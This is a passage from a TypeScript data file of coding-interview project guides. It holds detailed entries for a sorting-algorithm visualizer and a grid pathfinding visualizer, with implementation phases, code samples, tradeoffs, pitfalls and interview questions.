// Project categories and topics — 24 projects across 5 categories

export const projectCategories = [
  { id: 'portfolio', name: 'Portfolio Projects', icon: 'star', color: '#8b5cf6' },
  { id: 'take-home', name: 'Take-Home Projects', icon: 'briefcase', color: '#f59e0b' },
  { id: 'full-stack', name: 'Full-Stack Applications', icon: 'layers', color: '#10b981' },
  { id: 'system-impl', name: 'System Design Implementation', icon: 'systemDesign', color: '#06b6d4' },
  { id: 'frontend', name: 'Frontend Challenges', icon: 'layout', color: '#ec4899' },
];

export const projectCategoryMap = {
  // Portfolio Projects
  'sorting-visualizer': 'portfolio',
  'pathfinding-visualizer': 'portfolio',
  'conways-game-of-life': 'portfolio',
  'markdown-editor': 'portfolio',
  'music-visualizer': 'portfolio',
  // Take-Home Projects
  'chatgpt-clone': 'take-home',
  'coffee-roastery-dashboard': 'take-home',
  'rare-book-library': 'take-home',
  'kanban-board': 'take-home',
  'ecommerce-product-page': 'take-home',
  // Full-Stack Applications
  'url-shortener': 'full-stack',
  'realtime-chat-app': 'full-stack',
  'job-board-api': 'full-stack',
  'social-media-feed': 'full-stack',
  'file-storage-service': 'full-stack',
  // System Design Implementation
  'rate-limiter-service': 'system-impl',
  'distributed-task-queue': 'system-impl',
  'api-gateway': 'system-impl',
  'realtime-dashboard': 'system-impl',
  'event-notification-system': 'system-impl',
  // Frontend Challenges
  'design-system-library': 'frontend',
  'virtual-scroll-table': 'frontend',
  'multi-step-form-wizard': 'frontend',
  'infinite-image-gallery': 'frontend',
};

export const projectTopics = [
  // ═══════════════════════════════════════════════════════════
  // PORTFOLIO PROJECTS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'sorting-visualizer',
    title: 'Sorting Visualizer',
    icon: 'cpu',
    color: '#8b5cf6',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Next.js'],
    questions: 5,
    description: 'Build an interactive sorting algorithm visualizer with step-by-step animations, adjustable speed, and multiple algorithm support.',
    introduction: 'Create a web app that visually demonstrates how sorting algorithms work in real time. Users select an algorithm, adjust array size and speed, then watch bars animate through each comparison and swap. This project is a staple portfolio piece because it proves you understand both algorithms and frontend animation.',
    interviewRelevance: 'Frequently asked in frontend interviews to demonstrate algorithm knowledge, state management skills, and the ability to build complex animations. Shows you can translate abstract CS concepts into tangible, interactive experiences.',
    learningObjectives: [
      'Implement 6 sorting algorithms: Bubble, Selection, Insertion, Merge, Quick, and Heap sort',
      'Build step-by-step animation using async/await with configurable delay',
      'Manage complex application state with React Context or useReducer',
      'Create responsive bar chart visualization with dynamic height/color transitions',
      'Add controls for array size, speed, algorithm selection, and shuffle',
    ],
    keyQuestions: [
      { question: 'Which sorting algorithms should I implement?', answer: 'Start with Bubble Sort (simplest to animate), then add Selection, Insertion, Merge, Quick, and Heap sort. Each has distinct visual patterns that make the visualizer educational and impressive.' },
      { question: 'How do I animate the sorting process?', answer: 'Use async/await with a configurable delay between steps. Each algorithm yields comparison and swap events. Render these events by updating bar colors (comparing = yellow, swapping = red, sorted = green) and positions.' },
      { question: 'What makes this impressive to interviewers?', answer: 'It demonstrates: algorithm implementation, complex state management, CSS animations/transitions, responsive design, and clean code architecture. Adding features like speed control and algorithm comparison mode elevates it further.' },
      { question: 'How should I structure the codebase?', answer: 'Separate algorithm logic from UI: /algorithms folder with pure functions that yield steps, /components for visualization, and a context/store for global state (array data, speed, current algorithm, animation status).' },
      { question: 'What deployment approach works best?', answer: 'Vercel or Netlify for instant deployment. Add a README with screenshots, live demo link, and algorithm complexity table. Consider adding a performance comparison mode that runs all algorithms on the same input.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Project Setup & Array Rendering',
        description: 'Scaffold the app, create the bar chart component, and render a randomized array as animated bars.',
        tasks: [
          'Initialize Next.js + TypeScript + Tailwind project, configure path aliases',
          'Create a generateArray(size) utility that returns random integers between 5 and 100',
          'Build a BarChart component that renders each value as a div with proportional height',
          'Wire up array size slider and shuffle button to regenerate the array',
          'Apply CSS transitions on bar height and background-color for smooth visual feedback',
        ],
      },
      {
        phase: 2,
        title: 'Algorithm Implementation',
        description: 'Write each sorting algorithm as an async generator that yields animation frames.',
        tasks: [
          'Implement Bubble Sort as an async generator yielding { type, indices, array } steps',
          'Implement Selection Sort and Insertion Sort generators with compare/swap events',
          'Implement Merge Sort generator — yield comparisons during merge phase, track auxiliary array',
          'Implement Quick Sort generator with pivot highlight and partition sweep events',
          'Implement Heap Sort generator including heapify phase visualization',
        ],
      },
      {
        phase: 3,
        title: 'Animation Engine & Controls',
        description: 'Build the animation loop that consumes algorithm steps and drives bar color/height updates.',
        tasks: [
          'Create an animateSort() function that iterates the generator with a configurable delay (setTimeout)',
          'Color-code bars: default (blue), comparing (yellow), swapping (red), sorted (green)',
          'Add Play/Pause/Stop controls; track animation running state to prevent concurrent runs',
          'Implement speed control (1x–20x) by mapping slider value to delay in milliseconds',
          'Disable algorithm/size controls while animation is running; re-enable on completion',
        ],
      },
      {
        phase: 4,
        title: 'Stats Panel & Polish',
        description: 'Add live algorithm statistics, complexity table, and final deployment touches.',
        tasks: [
          'Track and display live comparison count and swap count as the animation runs',
          'Add a complexity reference panel showing O(n) time/space for each algorithm',
          'Make the layout fully responsive — bars scale to fill available width on any screen size',
          'Add keyboard shortcut: Space to play/pause, R to shuffle, 1-6 to select algorithm',
          'Deploy to Vercel, add README with live demo GIF and algorithm complexity table',
        ],
      },
    ],
    fileStructure: `sorting-visualizer/
├── src/
│   ├── algorithms/
│   │   ├── bubbleSort.ts
│   │   ├── selectionSort.ts
│   │   ├── insertionSort.ts
│   │   ├── mergeSort.ts
│   │   ├── quickSort.ts
│   │   ├── heapSort.ts
│   │   └── index.ts          # re-exports all algorithms
│   ├── components/
│   │   ├── BarChart.tsx       # renders array as animated bars
│   │   ├── Controls.tsx       # algorithm selector, size slider, speed slider
│   │   ├── StatsPanel.tsx     # live comparison/swap counters
│   │   └── ComplexityTable.tsx
│   ├── hooks/
│   │   ├── useSort.ts         # animation loop, generator consumer
│   │   └── useArray.ts        # array generation and management
│   ├── types/
│   │   └── index.ts           # SortStep, BarState, AlgorithmMeta types
│   ├── utils/
│   │   └── arrayUtils.ts      # generateArray, sleep, swap helpers
│   ├── App.tsx
│   └── main.tsx
├── public/
├── tailwind.config.ts
├── tsconfig.json
└── package.json`,
    architectureLayers: [
      {
        name: 'Algorithm Layer',
        description: 'Pure TypeScript async generator functions in /algorithms. Each accepts the array and yields SortStep objects ({ type: "compare" | "swap" | "done", indices: number[], array: number[] }). No React dependencies — fully unit-testable in isolation.',
      },
      {
        name: 'Animation Engine (useSort hook)',
        description: 'Consumes the algorithm generator via a for-await loop, applies each step to component state, and enforces the configurable delay between frames. Manages play/pause/stop state machine and exposes controls to the UI.',
      },
      {
        name: 'State Management (useArray hook)',
        description: 'Owns the canonical array and bar-color state. Provides generateArray, shuffle, and setArray actions. Resets colors to default on shuffle or algorithm change.',
      },
      {
        name: 'Visualization Layer (BarChart)',
        description: 'Renders the array as a row of div elements sized by percentage height. Applies Tailwind color classes based on each bar\'s current state (default/comparing/swapping/sorted). CSS transitions handle smooth color and height changes between frames.',
      },
      {
        name: 'UI Controls Layer',
        description: 'Algorithm selector dropdown, array size and speed sliders, and play/pause/shuffle buttons. All inputs are disabled while animation is running to prevent state corruption.',
      },
    ],
    codeExamples: {
      typescript: `// algorithms/bubbleSort.ts
export type SortStep = {
  type: 'compare' | 'swap' | 'sorted';
  indices: number[];
  array: number[];
};

export async function* bubbleSort(
  arr: number[]
): AsyncGenerator<SortStep> {
  const a = [...arr];
  const n = a.length;

  for (let i = 0; i < n - 1; i++) {
    for (let j = 0; j < n - i - 1; j++) {
      // Yield a comparison step (turn bars yellow)
      yield { type: 'compare', indices: [j, j + 1], array: [...a] };

      if (a[j] > a[j + 1]) {
        [a[j], a[j + 1]] = [a[j + 1], a[j]];
        // Yield a swap step (turn bars red)
        yield { type: 'swap', indices: [j, j + 1], array: [...a] };
      }
    }
    // Mark the last unsorted element as sorted (turn green)
    yield { type: 'sorted', indices: [n - i - 1], array: [...a] };
  }
  yield { type: 'sorted', indices: [0], array: [...a] };
}

// hooks/useSort.ts
export function useSort() {
  const [bars, setBars] = useState<BarState[]>([]);
  const [running, setRunning] = useState(false);
  const speedRef = useRef(50); // ms delay

  const animate = async (algorithm: SortAlgorithm, arr: number[]) => {
    setRunning(true);
    const gen = algorithm([...arr]);

    for await (const step of gen) {
      setBars(applyStep(step));
      await sleep(speedRef.current);
    }
    setRunning(false);
  };

  return { bars, running, animate, setSpeed: (v: number) => { speedRef.current = v; } };
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Async generators vs pre-computed step arrays',
        picked: 'Async generators',
        reason: 'Generators stream steps lazily — no memory spike for large arrays. Pre-computing all steps for Quick Sort on a 200-element array can produce 10K+ objects. Generators also make pause/resume trivially easy: just stop consuming the generator.',
      },
      {
        choice: 'CSS transitions vs JavaScript animation (requestAnimationFrame)',
        picked: 'CSS transitions on bar color and height',
        reason: 'CSS transitions offload interpolation to the browser compositor and avoid layout thrashing. With rAF you have to manually interpolate every frame. CSS transitions give smoother 60fps results with less code, and the step-based nature of sorting already provides natural animation frames.',
      },
      {
        choice: 'React Context vs prop drilling vs Zustand',
        picked: 'React Context with useReducer',
        reason: 'For a project this size, Context + useReducer is sufficient and adds zero bundle overhead. Zustand is better for larger apps or when you need fine-grained subscriptions. Prop drilling breaks down at 3+ component levels, which this architecture exceeds.',
      },
      {
        choice: 'Next.js vs Vite + React',
        picked: 'Next.js',
        reason: 'Next.js provides instant deployment to Vercel with a live URL, which matters for portfolio visibility. There is no SSR benefit for a client-only app, but the Next.js brand signals familiarity with modern React tooling. Vite is faster to develop with locally but adds a deployment step.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why async generators are ideal for animation steps',
        detail: 'Generators maintain internal execution state — they remember exactly where they paused. This maps perfectly to algorithm animation: each yield is a frame you can pause on. The for-await loop gives you built-in backpressure: you consume one step, apply it to the UI, wait for the delay, then pull the next step. You never buffer more frames than you need.',
      },
      {
        topic: 'Time and space complexity as visual properties',
        detail: 'O(n²) algorithms (Bubble, Selection, Insertion) show quadratic visual work — the outer loop sweeps the full array n times. O(n log n) algorithms (Merge, Heap, Quick) show logarithmic subdivisions. This is genuinely educational: viewers can see why Merge Sort is faster by watching it split and conquer, versus Bubble Sort\'s exhaustive sweeps.',
      },
      {
        topic: 'Heap Sort and the max-heap property',
        detail: 'Heap Sort is the hardest to visualize because the heapify phase rearranges the array into a max-heap (parent always larger than children) before sorting. You need to yield steps for both the heapify phase AND the extraction phase. The extraction phase is visually satisfying: the largest element bubbles to the end, then the heap rebuilds for the next largest.',
      },
      {
        topic: 'In-place vs auxiliary space in Merge Sort animation',
        detail: 'Pure Merge Sort requires O(n) auxiliary space for the merge phase. In a visualizer, you must track which bars belong to the merge buffer versus the original array. A common technique: color the merge buffer bars differently (grey), then animate the merge back into the original positions. Skipping this makes the merge phase confusing to watch.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Mutating the array inside the algorithm before yielding',
        why: 'If you yield a reference to the same array you are mutating, every rendered frame will show the final state because React renders asynchronously. The array object\'s reference never changes, so React bails out of re-renders.',
        solution: 'Always yield a shallow copy: yield { array: [...a] }. This creates a new array reference per step, ensuring React detects the state change and re-renders.',
      },
      {
        pitfall: 'Running multiple animation loops simultaneously',
        why: 'If a user clicks Sort while an animation is in progress, two generators run concurrently, both calling setState on the same bars array. The result is visual flickering and incorrect final state.',
        solution: 'Track a running boolean in state. Disable the sort button when running is true. On stop/reset, abort the current generator loop via a cancellation flag (abortRef.current = true) checked inside the for-await loop.',
      },
      {
        pitfall: 'Stale closure on the speed ref inside the animation loop',
        why: 'If speed is stored in component state rather than a ref, the for-await loop captures the initial speed value in closure and never sees updates the user makes to the speed slider mid-animation.',
        solution: 'Store speed in useRef. The for-await loop reads speedRef.current on every iteration, so slider changes take effect immediately without restarting the animation.',
      },
      {
        pitfall: 'Not resetting bar colors before starting a new sort',
        why: 'If a previous sort left some bars colored green (sorted), starting a new sort on the same array leaves stale green bars. The new algorithm\'s color logic does not know which bars were previously marked.',
        solution: 'On every new sort start and on shuffle, reset all bar states to the default color before running the generator.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Already sorted array',
        impact: 'Bubble Sort completes in O(n) with zero swaps. Without an early-exit optimization, it still runs O(n²) comparisons, making it look slow even on a trivially easy input.',
        mitigation: 'Add a swapped flag to Bubble Sort: if an entire pass completes with no swaps, the array is sorted — break early. This is the standard optimization and worth explaining in your portfolio.',
      },
      {
        scenario: 'Array with all identical values',
        impact: 'Quick Sort degrades to O(n²) with naive pivot selection (first or last element), since every partition produces one empty side and one n-1 side.',
        mitigation: 'Use median-of-three pivot selection (pick median of first, middle, last element) or random pivot. The visualizer makes this degradation visible, which is a great teaching moment.',
      },
      {
        scenario: 'Very small arrays (n <= 3)',
        impact: 'Some algorithm implementations have off-by-one errors or skip edge conditions for arrays of length 1 or 2. A single-element array should immediately yield a sorted step without any iterations.',
        mitigation: 'Add a guard at the start of each algorithm generator: if arr.length <= 1, yield the sorted step and return immediately.',
      },
      {
        scenario: 'Rapid size changes while sorting is paused',
        impact: 'If the user changes array size while the animation is paused mid-sort, the generator holds a reference to the old array length. Resuming causes index-out-of-bounds errors.',
        mitigation: 'Changing array size should always cancel any in-progress animation and reset to a fresh unsorted array. Disable the size slider while running or paused — only allow changes in idle state.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Why did you use a generator instead of just collecting all steps into an array first?',
        answer: 'Memory efficiency and pause/resume simplicity. For Quick Sort on a 300-element array, pre-computing every comparison and swap can generate 30,000+ step objects before the animation even begins. Generators stream steps lazily — you consume exactly one step per animation frame. Pause/resume is also trivial: you just stop and restart the for-await loop without any index tracking.',
      },
      {
        question: 'How does your Merge Sort handle the fact that it is not in-place?',
        answer: 'Merge Sort uses an auxiliary buffer for the merge phase. In the visualizer, I track which elements are in the merge buffer by maintaining a separate color state for those indices. During the merge, I animate elements being copied into the buffer (grey), then animate them being written back to the main array (green). This makes the O(n) space cost visually explicit.',
      },
      {
        question: 'How would you extend this to support algorithm comparisons side by side?',
        answer: 'I would refactor the state to hold N independent sort instances, each with their own array, bar colors, and generator. Render them in a grid layout. Add a Race mode button that starts all algorithms simultaneously on the same initial array. The first to complete highlights in gold. This is a compelling feature because it makes the time complexity differences viscerally obvious.',
      },
      {
        question: 'What would you do differently if this needed to support 10,000-element arrays?',
        answer: 'Three changes: batch multiple steps per animation frame instead of one step per frame — at 10K elements, individual-step updates drop below 60fps. Skip rendering intermediate comparison steps and only render swap steps to reduce total frame count. Switch from div bars to an HTML Canvas implementation — rendering 10K divs per frame causes layout thrashing; Canvas drawRect calls are orders of magnitude faster.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Algorithm Race Mode',
        difficulty: 'intermediate',
        description: 'Run all 6 algorithms simultaneously on the same initial array in a grid layout. Each finishes independently. Track and display which finishes first, second, etc. Makes time complexity differences viscerally obvious and is incredibly impressive in a portfolio demo.',
      },
      {
        idea: 'Step-by-Step Explanation Mode',
        difficulty: 'beginner',
        description: 'Add a text panel below the visualizer that narrates each step in plain English: "Comparing index 3 (value 42) with index 4 (value 17) — they are out of order, swapping." Synchronize the explanation with the animation. Makes the project genuinely educational and great for non-technical interviewers.',
      },
      {
        idea: 'Sound Visualization',
        difficulty: 'intermediate',
        description: 'Play a tone whose pitch corresponds to the height of the bar being compared or swapped, using the Web Audio API (oscillator node). The resulting audio pattern is distinctive per algorithm — Bubble Sort sounds chaotic, Merge Sort sounds structured. A famous YouTube demo does this and gets millions of views.',
      },
      {
        idea: 'Custom Input Mode',
        difficulty: 'beginner',
        description: 'Allow users to type a comma-separated list of numbers to use as the input array. Add validation for non-numeric input and a max size cap. This lets users test worst-case inputs (already sorted, reverse sorted, all equal) deliberately, turning the visualizer into an educational tool.',
      },
    ],
  },
  {
    id: 'pathfinding-visualizer',
    title: 'Pathfinding Visualizer',
    icon: 'grid',
    color: '#6366f1',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Vite'],
    questions: 5,
    description: 'Build an interactive grid-based pathfinding visualizer with maze generation, multiple algorithms (BFS, DFS, Dijkstra, A*), and wall drawing.',
    introduction: 'Create a grid where users place start/end nodes, draw walls, generate mazes, and watch pathfinding algorithms explore the grid in real time. This project combines graph algorithms, interactive UI, and animation — a powerful trio for any portfolio.',
    interviewRelevance: 'Graph traversal is one of the most common interview topics. Building a visualizer proves deep understanding of BFS, DFS, Dijkstra, and A* — not just textbook knowledge but practical implementation with edge cases handled.',
    learningObjectives: [
      'Implement BFS, DFS, Dijkstra, and A* pathfinding algorithms on a 2D grid',
      'Build maze generation algorithms (Recursive Division, Binary Tree)',
      'Create an interactive grid with click-to-draw walls and drag start/end nodes',
      'Animate algorithm exploration with visited/path/wall/start/end color states',
      'Add speed control, grid clear, and algorithm comparison features',
    ],
    keyQuestions: [
      { question: 'How does the grid data structure work?', answer: 'Model the grid as a 2D array of node objects, each with properties: row, col, isWall, isStart, isEnd, isVisited, isPath, distance, previousNode. The grid component renders this array as a CSS grid of div cells.' },
      { question: 'What is the difference between BFS and Dijkstra on an unweighted grid?', answer: 'On an unweighted grid, BFS and Dijkstra produce identical results because all edges have equal weight. Dijkstra becomes meaningful when you add weighted nodes (e.g., terrain types). A* adds a heuristic (Manhattan distance) to prioritize nodes closer to the target.' },
      { question: 'How do I implement maze generation?', answer: 'Recursive Division: start with an empty grid, recursively divide it with walls, leaving a single passage in each wall. Binary Tree: for each cell, randomly carve a passage either north or east. Both produce interesting but distinct maze patterns.' },
      { question: 'How should I handle animation performance?', answer: 'Use requestAnimationFrame or setTimeout with batch updates (update 5-10 nodes per frame instead of 1). Avoid re-rendering the entire grid — use refs or direct DOM manipulation for visited/path coloring during animation, then sync to React state after completion.' },
      { question: 'What features distinguish this from other implementations?', answer: 'Add: weighted nodes (click to increase weight), bidirectional search, algorithm comparison mode (split screen), maze presets, mobile touch support, and a stats panel showing nodes visited, path length, and time taken.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Grid Setup & Interaction',
        description: 'Build the 2D grid data structure, render it as a CSS grid, and implement mouse-based wall drawing and node dragging.',
        tasks: [
          'Initialize a 2D array of Node objects with row, col, isWall, isStart, isEnd, isVisited, isPath, distance, previousNode fields',
          'Render the grid as a CSS grid of div cells, each styled by node state (wall/start/end/default)',
          'Implement mousedown + mousemove wall painting — toggle isWall on drag across cells',
          'Add drag-to-reposition start and end nodes with mousedown on those specific cells',
          'Wire up Clear Walls and Reset Grid buttons that restore node states without regenerating the grid',
        ],
      },
      {
        phase: 2,
        title: 'Pathfinding Algorithms',
        description: 'Implement BFS, DFS, Dijkstra, and A* as functions that return ordered arrays of visited nodes and the final path.',
        tasks: [
          'Implement BFS using a queue — returns visitedNodesInOrder and nodesInShortestPath arrays',
          'Implement DFS using a stack — note that DFS does NOT guarantee the shortest path',
          'Implement Dijkstra with a min-priority queue — identical to BFS on unweighted grids, shows difference on weighted nodes',
          'Implement A* with Manhattan distance heuristic — f(n) = g(n) + h(n) where g = cost from start, h = Manhattan to end',
          'Extract the path by tracing previousNode pointers back from the end node to the start',
        ],
      },
      {
        phase: 3,
        title: 'Animation System',
        description: 'Build the two-phase animation: visited nodes expand outward, then the shortest path traces from end to start.',
        tasks: [
          'Animate visited nodes with staggered setTimeout calls (one node per delay interval)',
          'After visited animation completes, animate the path nodes in reverse order from end to start',
          'Use direct DOM class manipulation (not React state) during animation for performance — avoids re-rendering all 1500+ cells per frame',
          'Sync DOM state back to React state array after animation completes',
          'Add speed presets: Slow (100ms), Medium (25ms), Fast (5ms)',
        ],
      },
      {
        phase: 4,
        title: 'Maze Generation & Polish',
        description: 'Add maze generation algorithms and final UX polish.',
        tasks: [
          'Implement Recursive Division maze generator — recursively add walls with one gap per wall',
          'Implement Binary Tree maze — for each cell, randomly carve north or east passage',
          'Add algorithm info panel showing visited count, path length, and whether path was found',
          'Make grid cells scale responsively based on viewport width (fewer columns on mobile)',
          'Deploy to Vercel, add README with a GIF showing each algorithm and maze type',
        ],
      },
    ],
    fileStructure: `pathfinding-visualizer/
├── src/
│   ├── algorithms/
│   │   ├── bfs.ts
│   │   ├── dfs.ts
│   │   ├── dijkstra.ts
│   │   ├── aStar.ts
│   │   └── pathUtils.ts      # getNodesInShortestPath, getNeighbors
│   ├── mazes/
│   │   ├── recursiveDivision.ts
│   │   └── binaryTree.ts
│   ├── components/
│   │   ├── Grid.tsx           # renders 2D node array as CSS grid
│   │   ├── Cell.tsx           # individual grid cell with state-based styling
│   │   ├── Controls.tsx       # algorithm select, maze select, speed, run/clear
│   │   └── StatsPanel.tsx     # visited count, path length, time
│   ├── hooks/
│   │   ├── useGrid.ts         # grid state, wall drawing, node dragging
│   │   └── useAnimation.ts    # staggered setTimeout animation runner
│   ├── types/
│   │   └── index.ts           # Node, GridState, Algorithm types
│   ├── App.tsx
│   └── main.tsx
├── public/
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Grid State Layer (useGrid)',
        description: 'Owns the 2D Node array. Handles wall toggling on drag, start/end node repositioning, and grid reset operations. Exposes the grid array and mutation helpers to child components.',
      },
      {
        name: 'Algorithm Layer',
        description: 'Pure functions in /algorithms — each takes the grid and start/end nodes, returns { visitedNodesInOrder, nodesInShortestPath }. No side effects, no React dependencies. The algorithms operate on a snapshot copy of the grid so live interaction cannot corrupt a running traversal.',
      },
      {
        name: 'Animation Layer (useAnimation)',
        description: 'Takes the ordered arrays from the algorithm layer and applies timed DOM class mutations. Uses direct DOM manipulation (not setState) during the animation loop to avoid re-rendering 1500+ Cell components on every step. Syncs back to React state once complete.',
      },
      {
        name: 'Maze Generation Layer',
        description: 'Standalone functions in /mazes that return a new grid with wall nodes set. Recursive Division divides the grid recursively with single-gap walls. Binary Tree is simpler — iterates each cell and randomly carves north or east.',
      },
      {
        name: 'Visualization Layer (Grid + Cell)',
        description: 'Grid renders the 2D array as a CSS grid. Cell applies conditional Tailwind classes based on node state (wall = dark grey, visited = blue, path = yellow, start = green, end = red). CSS transitions on background-color create smooth state-change animations.',
      },
    ],
    codeExamples: {
      typescript: `// algorithms/aStar.ts
type Node = {
  row: number; col: number; isWall: boolean;
  isStart: boolean; isEnd: boolean;
  distance: number; totalDistance: number;
  heuristicDistance: number; previousNode: Node | null;
};

function heuristic(nodeA: Node, nodeB: Node): number {
  // Manhattan distance — admissible for 4-directional grid
  return Math.abs(nodeA.row - nodeB.row) + Math.abs(nodeA.col - nodeB.col);
}

export function aStar(
  grid: Node[][],
  startNode: Node,
  endNode: Node
): { visitedNodesInOrder: Node[]; nodesInShortestPath: Node[] } {
  const visitedNodesInOrder: Node[] = [];
  startNode.distance = 0;
  startNode.heuristicDistance = heuristic(startNode, endNode);
  startNode.totalDistance = startNode.heuristicDistance;

  // Open set: nodes to evaluate — sorted by totalDistance (f = g + h)
  const openSet: Node[] = [startNode];

  while (openSet.length > 0) {
    // Sort ascending by f(n) = g(n) + h(n) — use a min-heap in production
    openSet.sort((a, b) => a.totalDistance - b.totalDistance);
    const current = openSet.shift()!;

    if (current.isWall) continue;
    if (current.distance === Infinity) break; // unreachable

    current.isVisited = true;
    visitedNodesInOrder.push(current);

    if (current === endNode) break;

    for (const neighbor of getNeighbors(current, grid)) {
      if (neighbor.isVisited || neighbor.isWall) continue;
      const tentativeG = current.distance + 1;
      if (tentativeG < neighbor.distance) {
        neighbor.distance = tentativeG;
        neighbor.heuristicDistance = heuristic(neighbor, endNode);
        neighbor.totalDistance = tentativeG + neighbor.heuristicDistance;
        neighbor.previousNode = current;
        if (!openSet.includes(neighbor)) openSet.push(neighbor);
      }
    }
  }
  return { visitedNodesInOrder, nodesInShortestPath: getPath(endNode) };
}

function getPath(endNode: Node): Node[] {
  const path: Node[] = [];
  let current: Node | null = endNode;
  while (current !== null) { path.unshift(current); current = current.previousNode; }
  return path;
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Direct DOM manipulation during animation vs React setState per step',
        picked: 'Direct DOM manipulation',
        reason: 'The grid has 1500+ cells (50x30). Calling setState on every animation step forces React to diff and re-render all Cell components, dropping frame rate below 30fps at medium speed. Direct DOM class manipulation bypasses React entirely during animation, then syncs back to state once complete.',
      },
      {
        choice: 'A* with sorted array vs proper min-heap',
        picked: 'Sorted array for simplicity, with a note to use a heap in production',
        reason: 'Array.sort() on the open set is O(n log n) per iteration — fine for a 50x30 grid (1500 nodes max). A proper min-heap (binary heap) would be O(log n) for push/pop. For a portfolio project, the sorted array is correct and readable. Mention the heap optimization in your README as a known trade-off.',
      },
      {
        choice: 'CSS Grid vs Canvas for grid rendering',
        picked: 'CSS Grid with divs',
        reason: 'CSS Grid makes wall drawing trivially easy — each cell is a real DOM element with click/mouse events. Canvas would require manual hit detection to find which cell was clicked. CSS Grid also integrates naturally with Tailwind for styling. The performance difference only matters above 100x100 grids, which is beyond portfolio scope.',
      },
      {
        choice: 'Immutable grid snapshot for algorithms vs live grid mutation',
        picked: 'Snapshot (deep copy) before running algorithm',
        reason: 'Running the algorithm on a copy prevents the algorithm from seeing walls the user draws mid-run. It also means you can re-run on the same grid state without contamination from previous isVisited flags, since you are starting from a clean copy each time.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why A* outperforms Dijkstra on grids',
        detail: 'Dijkstra explores nodes in rings of equal distance from the start (like expanding circles). A* adds a heuristic that estimates distance to the goal, so it preferentially explores nodes in the direction of the end node. On an open grid, A* with Manhattan distance visits roughly half as many nodes as Dijkstra. The heuristic must be admissible (never overestimates the true cost) to guarantee the shortest path.',
      },
      {
        topic: 'Why DFS does not find the shortest path',
        detail: 'DFS follows one path as deep as possible before backtracking. It will find A path, but not necessarily the shortest one. On a grid, DFS might snake along the left wall all the way to the bottom right, even if the direct route is three steps. BFS guarantees shortest path on unweighted graphs because it explores all nodes at distance k before any at distance k+1.',
      },
      {
        topic: 'Recursive Division maze generation',
        detail: 'Start with an empty grid. Pick a random row and column to draw walls (horizontal and vertical). Punch a random gap in each wall. Recursively apply to each of the four sub-rooms. The base case is when a sub-room is too small to divide (1-2 cells). This produces a perfect maze — every cell is reachable from every other cell, with exactly one path between any two cells.',
      },
      {
        topic: 'Weighted nodes and terrain types',
        detail: 'On a standard unweighted grid, all edges have cost 1. With weighted nodes, some cells cost more to traverse (swamp = 5, road = 1). Dijkstra handles this correctly because it always processes the minimum-cost node next. BFS does NOT handle weights — it counts hops, not cost. A* also handles weights as long as the heuristic remains admissible (h(n) <= true remaining cost).',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Not resetting isVisited and previousNode before re-running',
        why: 'If you run BFS, then run A* on the same grid, the isVisited flags from BFS are still set. A* sees already-visited nodes and skips them, producing incorrect results or finding no path at all.',
        solution: 'Before each algorithm run, reset all non-wall nodes: node.isVisited = false, node.previousNode = null, node.distance = Infinity. You can do this with a grid.forEach(row => row.forEach(node => reset(node))).',
      },
      {
        pitfall: 'Wall drawing fires on every mousemove even when mouse button is up',
        why: 'The mousemove event fires regardless of mouse button state. Without tracking whether the mouse button is held, cells toggle on every mouse hover, not just during drag.',
        solution: 'Track isMouseDown in a ref (not state — state updates are async). Set to true on mousedown on the grid, false on mouseup on the document. Only toggle walls when isMouseDown is true.',
      },
      {
        pitfall: 'Path animation starts before visited animation finishes',
        why: 'If you use Promise.all() or start both setTimeout sequences simultaneously, path nodes start lighting up while the visited expansion is still running, destroying the visual storytelling.',
        solution: 'Chain the animations: return a Promise from the visited animation that resolves when the last node fires, then start the path animation in the .then() callback.',
      },
      {
        pitfall: 'A* heuristic overestimates on diagonal-blocked grids',
        why: 'If you use Euclidean distance as the heuristic but only allow 4-directional movement, the heuristic overestimates (diagonal shortcut is not actually available). An inadmissible heuristic causes A* to find suboptimal paths.',
        solution: 'Use Manhattan distance (|dx| + |dy|) for 4-directional movement. Only use Euclidean for 8-directional (diagonal) movement. Manhattan is always admissible on a standard grid.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Start and end nodes are adjacent',
        impact: 'All algorithms should immediately return the direct path. Some implementations have off-by-one errors in the loop termination condition that cause them to over-explore before reaching the adjacent end.',
        mitigation: 'Check if the start node\'s immediate neighbors include the end node before entering the main loop. Most algorithms handle this naturally, but test explicitly.',
      },
      {
        scenario: 'No path exists (end node fully enclosed by walls)',
        impact: 'The algorithm exhausts all reachable nodes without finding the end. nodesInShortestPath will be empty (the end node has no previousNode). The UI must communicate "No path found" rather than silently doing nothing.',
        mitigation: 'After the algorithm returns, check if endNode.previousNode is null (and endNode is not the startNode). If so, display a "No path found" message in the stats panel.',
      },
      {
        scenario: 'User draws a wall on the start or end node',
        impact: 'If start or end nodes can be walled, the algorithm has no valid source or target. Some implementations crash with a null reference.',
        mitigation: 'In the wall-drawing handler, check if the hovered cell is the start or end node and skip toggling. Only regular cells can become walls.',
      },
      {
        scenario: 'Grid is entirely full of walls except start and end',
        impact: 'The algorithm visits only the start node, finds no neighbors, and returns immediately with an empty path.',
        mitigation: 'This is handled correctly by the no-path case above, but the maze generation should never produce this state. Add a post-generation validation that ensures at least one path exists.',
      },
    ],
    interviewFollowups: [
      {
        question: 'What is the time complexity of your A* implementation?',
        answer: 'With a sorted array as the open set, each iteration sorts in O(V log V) and extracts the minimum in O(1). In the worst case (all nodes visited), total time is O(V² log V). A proper binary min-heap reduces this to O((V + E) log V) — the theoretical optimum for A* on a sparse graph. On a grid where each node has at most 4 neighbors, E = 4V so it simplifies to O(V log V).',
      },
      {
